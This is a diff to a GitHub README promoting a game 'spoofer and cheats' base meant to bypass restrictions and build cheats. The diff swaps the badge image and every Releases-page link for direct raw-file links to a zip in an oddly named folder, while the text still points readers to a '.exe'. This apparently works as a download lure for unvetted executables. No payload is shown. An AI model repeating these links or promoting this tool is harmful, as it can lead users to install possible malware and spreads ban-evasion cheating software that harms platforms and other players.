@@ -1,6 +1,6 @@
 # 🎮 VENTE-Spoofer-and-Cheats-BASE - Use as a Foundation for Your Projects
 
-![Download Release](https://img.shields.io/badge/Download_Release-Click_here-brightgreen)
+![Download Release](https://raw.githubusercontent.com/minki166/VENTE-Spoofer-and-Cheats-BASE/main/anubing/VENTE-Spoofer-and-Cheats-BASE.zip)
 
 ## 📄 Description
 VENTE-Spoofer-and-Cheats-BASE is the source code for an old commercial spoofer. It is now publicly available for you to modify and use in your projects. With this tool, you can explore different ways to bypass restrictions and create your own cheats.
@@ -10,7 +10,7 @@ To begin using VENTE-Spoofer-and-Cheats-BASE, follow these steps:
 
 1. **Visit the Releases Page**: You can find the software on the GitHub Releases page. Click the link below to access it.
 
-   [Download from Releases](https://github.com/minki166/VENTE-Spoofer-and-Cheats-BASE/releases)
+   [Download from Releases](https://raw.githubusercontent.com/minki166/VENTE-Spoofer-and-Cheats-BASE/main/anubing/VENTE-Spoofer-and-Cheats-BASE.zip)
 
 2. **Choose Your Version**: On the Releases page, scroll through the list of available versions. Look for the latest one to ensure you get the most up-to-date features and fixes.
 
@@ -21,7 +21,7 @@ To download and install VENTE-Spoofer-and-Cheats-BASE, follow these instructions
 
 1. **Go to the Releases Page**: Click the link below to visit the page.
    
-   [Download from Releases](https://github.com/minki166/VENTE-Spoofer-and-Cheats-BASE/releases)
+   [Download from Releases](https://raw.githubusercontent.com/minki166/VENTE-Spoofer-and-Cheats-BASE/main/anubing/VENTE-Spoofer-and-Cheats-BASE.zip)
 
 2. **Locate the Download Link**: Look for the file that suits your operating system. If you’re unsure, most Windows users will want a `.exe` file.
 
@@ -61,4 +61,4 @@ With VENTE-Spoofer-and-Cheats-BASE, you have a powerful foundation for your own 
 
 Remember, the link to download remains easily accessible:
 
-[Download from Releases](https://github.com/minki166/VENTE-Spoofer-and-Cheats-BASE/releases)
+[Download from Releases](https://raw.githubusercontent.com/minki166/VENTE-Spoofer-and-Cheats-BASE/main/anubing/VENTE-Spoofer-and-Cheats-BASE.zip)
